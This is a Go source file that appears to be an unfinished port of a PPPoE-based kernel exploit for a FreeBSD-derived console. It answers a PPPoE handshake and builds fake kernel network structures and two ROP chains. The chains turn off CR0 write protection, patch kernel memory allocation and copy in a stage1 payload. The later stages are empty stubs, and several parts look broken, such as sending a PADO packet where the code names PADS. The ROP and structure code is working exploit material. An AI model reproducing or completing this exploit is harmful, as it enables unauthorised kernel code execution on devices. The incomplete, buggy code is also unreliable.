package main

import (
	"bytes"
	"context"
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"time"

	"PPPwn_go/lcp"
	"PPPwn_go/pppoe"
	"github.com/hujun-open/etherconn"
	"go.uber.org/zap"
)

const (
	SPRAY_NUM   = 0x1000
	PIN_NUM     = 0x1000
	CORRUPT_NUM = 0x1

	HOLE_START = 0x400
	HOLE_SPACE = 0x10

	LCP_ID  = 0x41
	IPCP_ID = 0x41

	SESSION_ID = 0xffff

	STAGE2_PORT = 9020

	SOURCE_MAC  = "41:41:41:41:41:41"
	SOURCE_IPV4 = "41.41.41.41"
	SOURCE_IPV6 = "fe80::4141:4141:4141:4141"

	TARGET_IPV4 = "42.42.42.42"

	BPF_FILTER = "(ip6) || (pppoed) || (pppoes && !ip)"
)

type Exploit struct {
	offs   Offset
	iface  string
	stage1 []byte
	stage2 []byte

	p     *pppoe.PPPoE
	econn *etherconn.EtherConn

	kaslr_offset uint64
	pppoe_softc  uint64
	target_mac   net.HardwareAddr
	source_mac   net.HardwareAddr
}

func NewExploit(offs Offset, iface string, stage1, stage2 []byte) *Exploit {
	e := &Exploit{
		offs:   offs,
		iface:  iface,
		stage1: stage1,
		stage2: stage2,
	}

	//e.s.L2socket(iface, BPF_FILTER)
	e.initClient()

	e.pppoe_softc = 0x100
	e.kaslr_offset = 0x200
	return e
}

func (e *Exploit) initClient() {
	ctx := context.Background()

	relay, err := etherconn.NewRawSocketRelayPcap(ctx, e.iface,
		etherconn.WithBPFFilter(BPF_FILTER),
		etherconn.WithDebug(true),
		etherconn.WithRecvTimeout(3*time.Second),
	)
	if err != nil {
		log.Fatal(err)
	}

	logger, _ := zap.NewDevelopment()
	econn := etherconn.NewEtherConn(str2mac(SOURCE_MAC), relay,
		etherconn.WithEtherTypes([]uint16{pppoe.EtherTypePPPoEDiscovery, pppoe.EtherTypePPPoESession}),
		etherconn.WithRecvMulticast(true), etherconn.WithVLANs(etherconn.VLANs{}))

	e.p = pppoe.NewPPPoE(econn, logger, pppoe.WithDebug(true))
	e.p.Open()
}

func (e *Exploit) kdlsym(addr uint64) uint64 {
	return e.kaslr_offset + addr
}

func (e *Exploit) lcp_negotiation() {
	fmt.Println("[*] Sending LCP configure request...")
	pkt := lcp.NewPkt(lcp.ProtoLCP)
	pkt.Code = lcp.CodeConfigureRequest
	pkt.ID = LCP_ID
	pktBytes, err := pkt.Serialize()
	if err != nil {
		log.Fatal(err)
	}
	ppppkt := lcp.NewPPPPkt(pktBytes, lcp.ProtoLCP)

	_ = ppppkt

}

func (e *Exploit) ipcp_negotiation() {

}

func (e *Exploit) ppp_negotation(cb func() []byte, ignore_initial_reqs bool) {
	var err error
	var res []byte
	var targetMac net.HardwareAddr
	var host_uniq []byte
	fmt.Printf("[*] Waiting for PADI...\n")
	for {
		b := make([]byte, 1500)
		n, mac, err := e.p.ReadFrom(b)
		if err != nil {
			log.Fatal(err)
		}
		targetMac = mac
		res = b[:n]
		packet := &pppoe.Pkt{}
		err = packet.Parse(res)
		if err == nil && packet.Code == pppoe.CodePADI {
			for _, tag := range packet.Tags {
				if tag.Type() == uint16(pppoe.TagTypeHostUniq) {
					host_uniq = tag.(*pppoe.TagByteSlice).Value
					break
				}
			}
			if host_uniq != nil {
				break
			}

		}
	}
	e.pppoe_softc = binary.LittleEndian.Uint64(host_uniq)

	fmt.Printf("[+] pppoe_softc: %x\n", host_uniq)
	e.target_mac = targetMac
	fmt.Printf("[+] Target MAC: %v\n", e.target_mac)
	e.source_mac = net.HardwareAddr(SOURCE_MAC)

	ac_cookie := []byte{}
	if cb != nil {
		ac_cookie = cb()
	}
	fmt.Printf("[+] AC cookie length: %X\n", len(ac_cookie))

	fmt.Printf("[*] Sending PADO...\n")

	pado := new(pppoe.Pkt)
	pado.Code = pppoe.CodePADO
	pado.Tags = []pppoe.Tag{
		&pppoe.TagByteSlice{
			Value:   ac_cookie,
			TagType: pppoe.TagTypeACCookie,
		},
		&pppoe.TagByteSlice{
			Value:   host_uniq,
			TagType: pppoe.TagTypeHostUniq,
		},
	}
	_, err = e.p.Send(pado, pppoe.EtherTypePPPoEDiscovery, e.target_mac)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Printf("[*] Waiting for PADR...\n")
	for {
		b := make([]byte, 1500)
		n, _, err := e.p.ReadFrom(b)
		if err != nil {
			log.Fatal(err)
		}
		res = b[:n]
		packet := &pppoe.Pkt{}
		err = packet.Parse(res)
		if err == nil && packet.Code == pppoe.CodePADR {
			break
		}
	}

	fmt.Printf("[*] Sending PADS...\n")
	pads := new(pppoe.Pkt)
	pads.Code = pppoe.CodePADS
	pads.SessionID = SESSION_ID
	pads.Tags = []pppoe.Tag{
		&pppoe.TagByteSlice{
			Value:   host_uniq,
			TagType: pppoe.TagTypeHostUniq,
		},
	}
	_, err = e.p.Send(pado, pppoe.EtherTypePPPoEDiscovery, e.target_mac)
	if err != nil {
		log.Fatal(err)
	}
}

func (e *Exploit) BuildFakeIfnet() []byte {
	planted := (e.pppoe_softc + 0x07) & 0xffffffffffff
	sourceMac := mac2str(toBytes(planted, 6, binary.LittleEndian))
	fmt.Printf("[+] Source MAC: %s\n", sourceMac)

	var fakeIfnet bytes.Buffer

	fakeIfnet.Write(bytes.Repeat([]byte("A"), 0x48-fakeIfnet.Len()))
	fakeIfnet.Write(p64(0)) // if_addrhead
	fakeIfnet.Write(bytes.Repeat([]byte("A"), 0x70-fakeIfnet.Len()))
	fakeIfnet.Write(p16(0x0001)) // if_index
	fakeIfnet.Write(bytes.Repeat([]byte("A"), 0xa0-fakeIfnet.Len()))
	fakeIfnet.Write(p8(IFT_ETHER)) // ifi_type
	fakeIfnet.Write(p8(0))         // ifi_physical
	fakeIfnet.Write(p8(0x8 + 0x1)) // ifi_addrlen
	fakeIfnet.Write(bytes.Repeat([]byte("A"), 0x1b8-fakeIfnet.Len()))
	fakeIfnet.Write(p64(e.pppoe_softc + PPPOE_SOFTC_SC_DEST)) // if_addr
	fakeIfnet.Write(bytes.Repeat([]byte("A"), 0x428-fakeIfnet.Len()))
	fakeIfnet.Write(p64(e.pppoe_softc + 0x10 - 0x8)) // nd_ifinfo

	fakeIfnet.Write(bytes.Repeat([]byte("A"), 0x480-fakeIfnet.Len()))
	fakeIfnet.Write(p64(0))             // lo_name
	fakeIfnet.Write(p32(RW_INIT_FLAGS)) // lo_flags
	fakeIfnet.Write(p32(0))             // lo_data
	fakeIfnet.Write(p64(0))             // lo_witness
	fakeIfnet.Write(p64(RW_UNLOCKED))   // rw_lock

	fakeIfnet.Write(bytes.Repeat([]byte("A"), 0x4c0-fakeIfnet.Len()))
	fakeIfnet.Write(p64(0))              // lo_name
	fakeIfnet.Write(p32(MTX_INIT_FLAGS)) // lo_flags
	fakeIfnet.Write(p32(0))              // lo_data
	fakeIfnet.Write(p64(0))              // lo_witness
	fakeIfnet.Write(p64(MTX_UNOWNED))    // mtx_lock

	return fakeIfnet.Bytes()
}

func (e *Exploit) BuildOverflowLle() []byte {
	var overflowLle bytes.Buffer

	overflowLle.Write(p64(e.pppoe_softc + PPPOE_SOFTC_SC_AC_COOKIE)) // le_next
	overflowLle.Write(p64(0))                                        // le_prev

	overflowLle.Write(p64(0))                        // lo_name
	overflowLle.Write(p32(RW_INIT_FLAGS | LO_DUPOK)) // lo_flags
	overflowLle.Write(p32(0))                        // lo_data
	overflowLle.Write(p64(0))                        // lo_witness
	overflowLle.Write(p64(RW_UNLOCKED))              // rw_lock

	overflowLle.Write(p64(e.pppoe_softc + PPPOE_SOFTC_SC_AC_COOKIE - LLTABLE_LLTIFP)) // lle_tbl
	overflowLle.Write(p64(0))                                                         // lle_head
	overflowLle.Write(p64(0))                                                         // lle_free
	overflowLle.Write(p64(0))                                                         // la_hold
	overflowLle.Write(p32(0))                                                         // la_numheld
	overflowLle.Write(p32(0))                                                         // pad
	overflowLle.Write(p64(0))                                                         // la_expire
	overflowLle.Write(p16(LLE_EXCLUSIVE))                                             // la_flags
	overflowLle.Write(p16(0))                                                         // la_asked
	overflowLle.Write(p16(0))                                                         // la_preempt
	overflowLle.Write(p16(0))                                                         // ln_byhint
	overflowLle.Write(p16(ND6_LLINFO_NOSTATE))                                        // ln_state
	overflowLle.Write(p16(0))                                                         // ln_router
	overflowLle.Write(p32(0))                                                         // pad
	overflowLle.Write(p64(0x7fffffffffffffff))                                        // ln_ntick

	return overflowLle.Bytes()
}

func (e *Exploit) BuildFakeLle() []byte {
	planted := e.kdlsym(e.offs.FIRST_GADGET) & 0xffffffffffff
	sourceMac := mac2str(toBytes(planted, 6, binary.LittleEndian))
	fmt.Printf("[+] Source MAC: %s\n", sourceMac)

	var fakeLle bytes.Buffer

	fakeLle.Write(p64(e.kdlsym(e.offs.POP_RBX_POP_R14_POP_RBP_JMP_QWORD_PTR_RSI_10))) // le_next
	fakeLle.Write(p64(NULL))                                                          // le_prev

	fakeLle.Write(p64(e.kdlsym(e.offs.LEA_RSP_RSI_20_REPZ_RET))) // lo_name
	fakeLle.Write(p32(RW_INIT_FLAGS | LO_DUPOK))                 // lo_flags
	fakeLle.Write(p32(0))                                        // lo_data
	fakeLle.Write(p64(e.kdlsym(e.offs.ADD_RSP_B0_POP_RBP_RET)))  // lo_witness
	fakeLle.Write(p64(RW_UNLOCKED))                              // rw_lock

	fakeLle.Write(p64(e.pppoe_softc + PPPOE_SOFTC_SC_DEST - LLTABLE_LLTFREE)) // lle_tbl
	fakeLle.Write(p64(NULL))                                                  // lle_head
	fakeLle.Write(p64(NULL))                                                  // lle_free
	fakeLle.Write(p64(NULL))                                                  // la_hold
	fakeLle.Write(p32(0))                                                     // la_numheld
	fakeLle.Write(p32(0))                                                     // pad
	fakeLle.Write(p64(0))                                                     // la_expire
	fakeLle.Write(p16(LLE_STATIC | LLE_EXCLUSIVE))                            // la_flags
	fakeLle.Write(p16(0))                                                     // la_asked
	fakeLle.Write(p16(0))                                                     // la_preempt
	fakeLle.Write(p16(0))                                                     // ln_byhint
	fakeLle.Write(p16(ND6_LLINFO_NOSTATE))                                    // ln_state
	fakeLle.Write(p16(0))                                                     // ln_router
	fakeLle.Write(p32(0))                                                     // pad
	fakeLle.Write(p64(0x7fffffffffffffff))                                    // ln_ntick
	fakeLle.Write(p32(0))                                                     // lle_refcnt
	fakeLle.Write(p32(0))                                                     // pad
	fakeLle.Write(p64be(0x414141414141))                                      // ll_addr

	fakeLle.Write(p64(0))                      // sle
	fakeLle.Write(p64(0))                      // tqe
	fakeLle.Write(p32(0))                      // c_time
	fakeLle.Write(p32(0))                      // pad
	fakeLle.Write(p64(NULL))                   // c_arg
	fakeLle.Write(p64(NULL))                   // c_func
	fakeLle.Write(p64(NULL))                   // c_lock
	fakeLle.Write(p32(CALLOUT_RETURNUNLOCKED)) // c_flags
	fakeLle.Write(p32(0))                      // c_cpu

	fakeLle.Write(p8(SOCKADDR_IN6_SIZE)) // sin6_len
	fakeLle.Write(p8(AF_INET6))          // sin6_family
	fakeLle.Write(p16(0))                // sin6_port
	fakeLle.Write(p32(0))                // sin6_flowinfo
	fakeLle.Write(p64be(0xfe80000100000000))
	fakeLle.Write(p64be(0x4141414141414141))
	fakeLle.Write(p32(0)) // sin6_scope_id

	fakeLle.Write(p32(0)) // pad

	//fakeLle[e.offs.SECOND_GADGET_OFF : e.offs.SECOND_GADGET_OFF+8] = p64(e.kdlsym(e.offs.PUSH_RBP_JMP_QWORD_PTR_RSI))

	fakeLleBytes := fakeLle.Bytes()
	var fakeLleResult bytes.Buffer
	fakeLleResult.Write(fakeLleBytes[:e.offs.SECOND_GADGET_OFF])
	fakeLleResult.Write(p64(e.kdlsym(e.offs.PUSH_RBP_JMP_QWORD_PTR_RSI)))
	fakeLleResult.Write(fakeLleBytes[e.offs.SECOND_GADGET_OFF+8:])

	rop2 := e.buildSecondRop()
	rop := e.buildFirstRop(fakeLleResult.Bytes(), rop2)

	fakeLleResult.Write(rop)
	fakeLleResult.Write(rop2)
	fakeLleResult.Write(e.stage1)
	return fakeLleResult.Bytes()
}

func (e *Exploit) buildFirstRop(fake_lle, rop2 []byte) []byte {
	var rop bytes.Buffer

	rop.Write(p64(e.kdlsym(e.offs.POP_R12_RET)))
	rop.Write(p64(e.kdlsym(e.offs.POP_RBP_RET)))
	rop.Write(p64(e.kdlsym(e.offs.MOV_RDI_RBX_CALL_R12)))
	rop.Write(p64(e.kdlsym(e.offs.POP_RCX_RET)))
	a := int64(-0x800)
	rop.Write(p64(uint64(a)))
	rop.Write(p64(e.kdlsym(e.offs.ADD_RDI_RCX_RET)))

	rop.Write(p64(e.kdlsym(e.offs.POP_RDX_RET)))
	ropOffFixup := rop.Len()
	rop.Write(p64(0xDEADBEEF))
	rop.Write(p64(e.kdlsym(e.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET)))
	rop.Write(p64(0xDEADBEEF))

	rop.Write(p64(e.kdlsym(e.offs.POP_RDX_RET)))
	rop.Write(p64(uint64(len(rop2) + len(e.stage1))))

	rop.Write(p64(e.kdlsym(e.offs.MEMCPY)))

	rop.Write(p64(e.kdlsym(e.offs.POP_RAX_RET)))
	rop.Write(p64(e.kdlsym(e.offs.POP_RBP_RET)))
	rop.Write(p64(e.kdlsym(e.offs.MOV_RSI_RBX_CALL_RAX)))
	rop.Write(p64(e.kdlsym(e.offs.POP_RDX_RET)))
	rop.Write(p64(0x800 + 0x20))
	rop.Write(p64(e.kdlsym(e.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET)))
	rop.Write(p64(0xDEADBEEF))
	rop.Write(p64(e.kdlsym(e.offs.LEA_RSP_RSI_20_REPZ_RET)))
	// rop[ropOffFixup : ropOffFixup+8] = p64(-len(fakeLle+rop))
	ropBytes := rop.Bytes()
	var ropResult bytes.Buffer
	ropResult.Write(ropBytes[:ropOffFixup])
	ropResult.Write(p64(uint64(-int64(len(fake_lle) + len(ropBytes)))))
	ropResult.Write(ropBytes[ropOffFixup+8:])
	return ropResult.Bytes()
}

func (e *Exploit) buildSecondRop() []byte {
	var rop bytes.Buffer

	rop.Write(p64(e.kdlsym(e.offs.POP_RDI_RET)))
	rop.Write(p64(IDT_UD))
	rop.Write(p64(e.kdlsym(e.offs.POP_RSI_RET)))
	rop.Write(p64(e.kdlsym(e.offs.ADD_RSP_28_POP_RBP_RET)))
	rop.Write(p64(e.kdlsym(e.offs.POP_RDX_RET)))
	rop.Write(p64(SDT_SYSIGT))
	rop.Write(p64(e.kdlsym(e.offs.POP_RCX_RET)))
	rop.Write(p64(SEL_KPL))
	rop.Write(p64(e.kdlsym(e.offs.POP_R8_POP_RBP_RET)))
	rop.Write(p64(0))
	rop.Write(p64(0xDEADBEEF))
	rop.Write(p64(e.kdlsym(e.offs.SETIDT)))

	rop.Write(p64(e.kdlsym(e.offs.POP_RSI_RET)))
	rop.Write(p64(CR0_ORI & ^CR0_WP))
	rop.Write(p64(e.kdlsym(e.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET)))

	rop.Write(p64(e.kdlsym(e.offs.POP_RAX_RET)))
	rop.Write(p64(VM_PROT_ALL))
	rop.Write(p64(e.kdlsym(e.offs.POP_RCX_RET)))
	rop.Write(p64(e.kdlsym(e.offs.KMEM_ALLOC_PATCH1)))
	rop.Write(p64(e.kdlsym(e.offs.MOV_BYTE_PTR_RCX_AL_RET)))
	rop.Write(p64(e.kdlsym(e.offs.POP_RCX_RET)))
	rop.Write(p64(e.kdlsym(e.offs.KMEM_ALLOC_PATCH2)))
	rop.Write(p64(e.kdlsym(e.offs.MOV_BYTE_PTR_RCX_AL_RET)))

	rop.Write(p64(e.kdlsym(e.offs.POP_RSI_RET)))
	rop.Write(p64(CR0_ORI))
	rop.Write(p64(e.kdlsym(e.offs.MOV_CR0_RSI_UD2_MOV_EAX_1_RET)))

	rop.Write(p64(e.kdlsym(e.offs.POP_RAX_RET)))
	rop.Write(p64(e.kdlsym(e.offs.RET)))
	rop.Write(p64(e.kdlsym(e.offs.POP_RDI_RET)))
	rop.Write(p64(e.kdlsym(e.offs.KERNEL_MAP)))
	rop.Write(p64(e.kdlsym(e.offs.MOV_RDI_QWORD_PTR_RDI_POP_RBP_JMP_RAX)))
	rop.Write(p64(0xDEADBEEF))

	rop.Write(p64(e.kdlsym(e.offs.POP_RSI_RET)))
	rop.Write(p64(PAGE_SIZE))

	rop.Write(p64(e.kdlsym(e.offs.KMEM_ALLOC)))

	rop.Write(p64(e.kdlsym(e.offs.POP_R8_POP_RBP_RET)))
	rop.Write(p64(e.kdlsym(e.offs.POP_RBP_RET)))
	rop.Write(p64(0xDEADBEEF))
	rop.Write(p64(e.kdlsym(e.offs.MOV_R14_RAX_CALL_R8)))

	rop.Write(p64(e.kdlsym(e.offs.POP_R12_RET)))
	rop.Write(p64(e.kdlsym(e.offs.POP_RBP_RET)))
	rop.Write(p64(e.kdlsym(e.offs.MOV_RDI_R14_CALL_R12)))

	rop.Write(p64(e.kdlsym(e.offs.PUSH_RSP_POP_RSI_RET)))
	ropRspPos := rop.Len()
	rop.Write(p64(e.kdlsym(e.offs.POP_RDX_RET)))
	ropOffFixup := rop.Len()
	rop.Write(p64(0xDEADBEEF))
	rop.Write(p64(e.kdlsym(e.offs.SUB_RSI_RDX_MOV_RAX_RSI_POP_RBP_RET)))
	rop.Write(p64(0xDEADBEEF))

	rop.Write(p64(e.kdlsym(e.offs.POP_RDX_RET)))
	rop.Write(p64(uint64(len(e.stage1))))

	rop.Write(p64(e.kdlsym(e.offs.MEMCPY)))

	rop.Write(p64(e.kdlsym(e.offs.JMP_R14)))

	// rop[ropOffFixup : ropOffFixup+8] = p64(-(len(rop) - ropRspPos))
	ropBytes := rop.Bytes()
	var ropResult bytes.Buffer
	ropResult.Write(ropBytes[:ropOffFixup])
	ropResult.Write(p64(uint64(-int64(len(ropBytes) - ropRspPos))))
	ropResult.Write(ropBytes[ropOffFixup+8:])
	return ropResult.Bytes()
}

func (e *Exploit) runStage0() {
	e.ppp_negotation(e.BuildFakeIfnet, false)
	e.lcp_negotiation()
	e.ipcp_negotiation()
}

func (e *Exploit) runStage1() {

}

func (e *Exploit) runStage2() {

}

func (e *Exploit) runStage3() {

}

func (e *Exploit) runStage4() {

}

func (e *Exploit) Run() {
	fmt.Println("[+] STAGE 0: Initialization")
	e.runStage0()
	fmt.Println("[+] STAGE 1: Memory corruption")
	e.runStage1()
	fmt.Println("[+] STAGE 2: KASLR defeat")
	e.runStage2()
	fmt.Println("[+] STAGE 3: Remote code execution")
	e.runStage3()
	fmt.Println("[+] STAGE 4: Arbitrary payload execution")
	e.runStage4()
}
